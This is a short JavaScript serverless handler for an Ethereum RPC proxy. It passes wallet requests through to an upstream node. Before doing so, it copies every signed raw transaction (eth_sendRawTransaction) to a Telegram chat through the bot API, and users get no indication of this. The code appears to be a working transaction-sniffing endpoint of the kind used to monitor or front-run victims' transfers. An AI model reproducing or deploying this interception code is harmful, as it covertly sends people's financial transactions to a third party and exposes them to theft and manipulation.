import axios from 'axios';

const FORWARD_TO = process.env.FORWARD_TO;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST allowed' });
  }

  try {
    if (req.body.method === 'eth_sendRawTransaction') {
      const rawTx = req.body.params[0];
      console.log('Raw TX:', rawTx);

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `🚨 New Raw TX:\n\n${rawTx}`,
      });
    }

    const response = await axios.post(FORWARD_TO, req.body, {
      headers: { 'Content-Type': 'application/json' },
    });

    res.status(200).json(response.data);
  } catch (error) {
    console.error('Forwarding error:', error.message);
    res.status(500).json({ error: 'Forwarding failed' });
  }
}
